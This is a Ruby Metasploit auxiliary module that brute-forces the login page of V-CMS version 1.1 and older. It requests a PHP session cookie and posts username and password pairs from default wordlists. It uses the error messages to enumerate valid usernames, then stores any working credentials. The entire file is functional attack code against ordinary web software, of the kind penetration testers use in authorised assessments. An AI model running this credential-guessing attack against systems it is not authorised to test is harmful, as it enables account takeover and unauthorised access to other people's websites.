##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'V-CMS Login Utility',
      'Description'    => %q{
        This module attempts to authenticate to an English-based V-CMS login interface. It
        should only work against version v1.1 or older, because these versions do not have
        any default protections against brute forcing.
      },
      'Author'         => [ 'sinn3r' ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptPath.new('USERPASS_FILE',  [ false, "File containing users and passwords separated by space, one pair per line",
          File.join(Msf::Config.data_directory, "wordlists", "http_default_userpass.txt") ]),
        OptPath.new('USER_FILE',  [ false, "File containing users, one per line",
          File.join(Msf::Config.data_directory, "wordlists", "http_default_users.txt") ]),
        OptPath.new('PASS_FILE',  [ false, "File containing passwords, one per line",
          File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt") ]),
        OptString.new('TARGETURI', [true, 'The URI path to V-CMS', '/vcms2/'])
      ])
  end


  def get_sid
    res = send_request_raw({
      'method' => 'GET',
      'uri'    => @uri
    })

    # Get the PHP session ID
    m = res.get_cookies.match(/(PHPSESSID=.+);/)
    id = (m.nil?) ? nil : m[1]

    return id
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: 'http',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: DateTime.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def do_login(user, pass)
    begin
      sid = get_sid
      if sid.nil?
        vprint_error("Failed to get sid")
        return :abort
      end

      res = send_request_cgi({
        'uri'    => "#{@uri}process.php",
        'method' => 'POST',
        'cookie' => sid,
        'vars_post' => {
          'user'     => user,
          'pass'     => pass,
          'sublogin' => '1'
        }
      })
      location = res.headers['Location']
      res = send_request_cgi({
        'uri' => location,
        'method' => 'GET',
        'cookie' => sid
      })
    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
      vprint_error("Service failed to respond")
      return :abort
    end

    if res
      case res.body
      when /User name does not exist/
        return :skip_user
      when /User name is not alphanumeric/
        return :skip_user
      when /User name not entered/
        return :skip_user
      when /User name already confirmed/
        return :skip_user
      when /Invalid password/
        vprint_status("Username found: #{user}")
      when /\<a href="process\.php\?logout=1"\>/
        print_good("Successful login: \"#{user}:#{pass}\"")
        report_cred(ip: rhost, port: rport, user:user, password: pass, proof: res.body)
        return :next_user
      end
    end

    return
  end

  def run
    @uri = normalize_uri(target_uri.path)
    @uri << "/" if @uri[-1, 1] != "/"

    super
  end

  def run_host(ip)
    each_user_pass { |user, pass|
      vprint_status("Trying \"#{user}:#{pass}\"")
      do_login(user, pass)
    }
  end
end
